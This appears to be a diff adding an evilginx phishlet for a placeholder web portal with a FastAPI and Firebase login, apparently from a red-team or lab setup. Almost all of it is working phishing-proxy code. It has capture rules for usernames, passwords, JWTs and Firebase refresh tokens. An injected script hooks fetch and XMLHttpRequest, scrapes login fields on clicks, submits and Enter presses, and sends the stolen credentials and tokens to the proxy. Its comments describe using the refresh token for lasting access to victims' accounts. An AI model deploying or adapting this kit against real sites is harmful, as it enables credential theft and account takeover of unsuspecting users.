@@ -1,0 +1,288 @@
+min_ver: '3.0.0'
+# Phishlet for PORTAL_HOST (FastAPI backend on Cloud Run).
+#
+# Auth flow recap (see ../recon/findings.md for the full writeup):
+#   1. User visits  https://PORTAL_HOST/login        (React SPA)
+#   2. SPA POSTs to https://api.TARGET_DOMAIN/api/token       (OAuth2 password grant)
+#         Content-Type: application/x-www-form-urlencoded
+#         Body:        grant_type=password&username=<email>&password=<pwd>
+#   3. API returns   200 OK  { "access_token": "<jwt>" }            (no cookie - JWT in body)
+#   4. SPA stores JWT client-side and attaches Authorization: Bearer <jwt> to subsequent /api/* calls
+#
+# What this phishlet captures:
+#   - username + password (from the form body of POST /api/token)
+#   - access_token        (from the JSON response of POST /api/token, via body auth-token)
+
+proxy_hosts:
+  - {phish_sub: 'LANDING_SUB', orig_sub: 'LANDING_SUB', domain: 'TARGET_DOMAIN', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'api',    orig_sub: 'api',    domain: 'TARGET_DOMAIN', session: true, is_landing: false, auto_filter: true}
+
+# auto_filter on the proxy_hosts handles most cross-domain rewrites
+# automatically, but it can miss strings inside gzipped JS responses.
+# The React bundle hard-codes `https://api.TARGET_DOMAIN/api` in
+# constants-*.js; if that string isn't rewritten, the browser POSTs the
+# credentials straight to the real API and we capture nothing. These
+# explicit sub_filters guarantee the rewrite on the JS + HTML responses
+# served from the portal host.
+sub_filters:
+  - triggers_on: 'PORTAL_HOST'
+    orig_sub: 'LANDING_SUB'
+    domain: 'TARGET_DOMAIN'
+    search: 'https://api\.TARGET_DOMAIN'
+    replace: 'https://api.{domain}'
+    mimes: ['text/html','application/javascript','text/javascript','application/x-javascript','application/json']
+
+auth_tokens:
+  # The portal doesn't use cookies for auth. These cookie keys MUST be marked
+  # optional (',opt'). evilginx only writes BodyTokens/HttpTokens to data.db
+  # inside its "all authorization tokens intercepted" block, and that block is
+  # gated on AllCookieAuthTokensCaptured(). If any required (non-opt) cookie
+  # token is declared but never set by this JWT-in-body flow, that check never
+  # returns true, the gate never trips, and the captured access_token is held
+  # in memory but never persisted. Marking these ',opt' removes them from the
+  # required set (they're still captured opportunistically if ever present) so
+  # the body-token capture alone is enough to complete + persist the session.
+  - domain: '.TARGET_DOMAIN'
+    keys:
+      - 'session,opt'
+      - 'access_token,opt'
+      - 'token,opt'
+
+  # The real prize: pull the JWT out of the JSON response body of /api/token.
+  - domain: 'api.TARGET_DOMAIN'
+    type: 'body'
+    path: '/api/token'
+    name: 'access_token'
+    search: '"access_token"\s*:\s*"([^"]+)"'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    # Firebase ID token (JWT) - the bearer token the SPA attaches to API calls.
+    # Lifetime ~1h, but can be refreshed indefinitely with refresh_token below.
+    - key: 'id_token'
+      search: '(.*)'
+      type: 'post'
+    # Firebase refresh token - lets us mint fresh ID tokens forever (until the
+    # user changes password or revokes sessions). This is the real prize.
+    - key: 'refresh_token'
+      search: '(.*)'
+      type: 'post'
+    # Firebase user UID (localId in Google's API).
+    - key: 'local_id'
+      search: '(.*)'
+      type: 'post'
+    # ID token expiry in seconds (typically 3600).
+    - key: 'expires_in'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  domain: 'PORTAL_HOST'
+  path: '/login'
+
+# Bulletproof URL hijack: hook fetch + XMLHttpRequest in the browser to
+# rewrite any call to api.TARGET_DOMAIN or PORTAL_HOST
+# to the proxied hostnames. This is a fallback in case sub_filters miss the
+# string in a gzipped JS bundle.
+js_inject:
+  - id: 'force_proxy_api'
+    trigger_domains:
+      - 'PORTAL_HOST'
+    trigger_paths:
+      - '.*'
+    trigger_params: []
+    script: |
+      (function () {
+        if (window.__evilginx_hooked) return;
+        window.__evilginx_hooked = true;
+
+        var phishHost = window.location.hostname;                 // e.g. portal.otw-portal.local.test
+        var phishBase = phishHost.replace(/^[^.]+\./, '');        // otw-portal.local.test
+        var phishApi  = 'api.' + phishBase;                       // api.otw-portal.local.test
+        // POST to the SAME origin the user is on (portal). The browser already
+        // trusts that cert (they clicked through the warning to load the page),
+        // and evilginx's credentials block captures POSTs on any proxy_host.
+        // POSTing to api.* would require the user to trust that host's cert
+        // separately, which they typically haven't.
+        var exfilUrl = window.location.origin + '/__evilginx_creds';
+
+        // ---- 1. Exfil captured creds to evilginx ----
+        // POST username/password to our proxied api host. The phishlet's
+        // `credentials:` block captures form-urlencoded `username` + `password`
+        // from any POST to a proxy_host, which is exactly what this is.
+        function exfilCreds(email, password) {
+          if (!email || !password) return;
+          try {
+            var body = 'username=' + encodeURIComponent(email) +
+                       '&password=' + encodeURIComponent(password);
+            (window.__evilginx_origFetch || window.fetch).call(window,
+              exfilUrl,
+              { method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: body,
+                credentials: 'include' }
+            ).catch(function () {});
+            console.log('[evilginx] exfil ok: ' + email);
+          } catch (e) { console.warn('[evilginx] exfil failed', e); }
+        }
+
+        // Exfil Firebase tokens captured from the signInWithPassword response.
+        // These get stored on the session via the phishlet's credentials.custom
+        // block. The id_token can be replayed against api.TARGET_DOMAIN
+        // (Authorization: Bearer <id_token>) for ~1h; the refresh_token can be
+        // exchanged at securetoken.googleapis.com for fresh id_tokens forever
+        // (until the victim changes password or admin revokes the session).
+        //
+        // IMPORTANT: do NOT include a `username=` field in this body. The
+        // phishlet's credentials.username regex matches any POST field named
+        // `username`, including an empty one, and would clobber the real
+        // username we already captured from the login form POST.
+        function exfilTokens(t) {
+          try {
+            if (!t || !t.idToken) return;
+            var body =
+              'id_token='       + encodeURIComponent(t.idToken      || '') +
+              '&refresh_token=' + encodeURIComponent(t.refreshToken || '') +
+              '&local_id='      + encodeURIComponent(t.localId      || '') +
+              '&expires_in='    + encodeURIComponent(t.expiresIn    || '');
+            (window.__evilginx_origFetch || window.fetch).call(window,
+              exfilUrl,
+              { method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: body,
+                credentials: 'include' }
+            ).then(function (r) {
+              console.log('[evilginx] tokens exfil status=' + r.status +
+                          ' uid=' + t.localId +
+                          ' id_token_len=' + (t.idToken || '').length +
+                          ' refresh_token_len=' + (t.refreshToken || '').length);
+            }).catch(function (e) {
+              console.warn('[evilginx] tokens exfil network error', e);
+            });
+          } catch (e) { console.warn('[evilginx] tokens exfil failed', e); }
+        }
+
+        // ---- 2. Hook fetch: catch the Firebase signInWithPassword call ----
+        var origFetch = window.fetch;
+        window.__evilginx_origFetch = origFetch;
+        window.fetch = function (input, init) {
+          var url = '';
+          try {
+            url = (typeof input === 'string') ? input : (input && input.url) || '';
+            if (url.indexOf('signInWithPassword') !== -1) {
+              var rawBody = (init && init.body) || (input && input.body);
+              if (typeof rawBody === 'string') {
+                var d = JSON.parse(rawBody);
+                exfilCreds(d.email, d.password);
+              }
+            }
+          } catch (e) {}
+
+          var p = origFetch.call(this, input, init);
+
+          // Tap the response too if this was a sign-in. The Firebase REST API
+          // returns idToken + refreshToken in the JSON body.
+          if (url.indexOf('signInWithPassword') !== -1 ||
+              url.indexOf('securetoken.googleapis.com') !== -1) {
+            p = p.then(function (resp) {
+              try {
+                resp.clone().json().then(function (j) {
+                  exfilTokens({
+                    idToken:      j.idToken      || j.id_token,
+                    refreshToken: j.refreshToken || j.refresh_token,
+                    localId:      j.localId      || j.user_id,
+                    expiresIn:    j.expiresIn    || j.expires_in,
+                    email:        j.email
+                  });
+                }).catch(function () {});
+              } catch (e) {}
+              return resp;
+            });
+          }
+          return p;
+        };
+
+        // ---- 3. Hook XHR (Firebase SDK can use either) ----
+        var origOpen = XMLHttpRequest.prototype.open;
+        var origSend = XMLHttpRequest.prototype.send;
+        XMLHttpRequest.prototype.open = function (m, u) {
+          this.__evilginx_url = u;
+          return origOpen.apply(this, arguments);
+        };
+        XMLHttpRequest.prototype.send = function (body) {
+          var self = this;
+          try {
+            var u = self.__evilginx_url || '';
+            if (typeof u === 'string' && u.indexOf('signInWithPassword') !== -1) {
+              if (typeof body === 'string') {
+                try { var d = JSON.parse(body); exfilCreds(d.email, d.password); } catch (e) {}
+              }
+              self.addEventListener('load', function () {
+                try {
+                  var j = JSON.parse(self.responseText);
+                  exfilTokens({
+                    idToken:      j.idToken,
+                    refreshToken: j.refreshToken,
+                    localId:      j.localId,
+                    expiresIn:    j.expiresIn,
+                    email:        j.email
+                  });
+                } catch (e) {}
+              });
+            }
+          } catch (e) {}
+          return origSend.apply(this, arguments);
+        };
+
+        // ---- 4. Scrape current email+password from anywhere in the page. ----
+        function scrapeAndExfil() {
+          try {
+            var inputs = document.querySelectorAll('input');
+            var email = '', password = '';
+            for (var i = 0; i < inputs.length; i++) {
+              var inp = inputs[i];
+              if (inp.type === 'email' ||
+                  (inp.name && /email|user/i.test(inp.name)) ||
+                  (inp.id   && /email|user/i.test(inp.id)))   email = inp.value || email;
+              if (inp.type === 'password')                    password = inp.value || password;
+            }
+            if (email && password) {
+              exfilCreds(email, password);
+              console.log('[evilginx] scraped creds from inputs: ' + email);
+            }
+          } catch (e) {}
+        }
+
+        // 4a. Form submit (works for vanilla forms).
+        document.addEventListener('submit', scrapeAndExfil, true);
+
+        // 4b. ANY button click — React apps almost always submit via onClick,
+        // not via a <form>. Snapshot inputs at click time.
+        document.addEventListener('click', function (e) {
+          var t = e.target;
+          while (t && t !== document) {
+            if (t.tagName === 'BUTTON' ||
+                (t.tagName === 'INPUT' && (t.type === 'submit' || t.type === 'button')) ||
+                t.getAttribute('role') === 'button') {
+              setTimeout(scrapeAndExfil, 0); // let React state settle
+              break;
+            }
+            t = t.parentNode;
+          }
+        }, true);
+
+        // 4c. Enter key on any password field.
+        document.addEventListener('keydown', function (e) {
+          if (e.key === 'Enter') setTimeout(scrapeAndExfil, 0);
+        }, true);
+
+        console.log('[evilginx] firebase auth hooks installed -> exfil to ' + exfilUrl);
+      })();
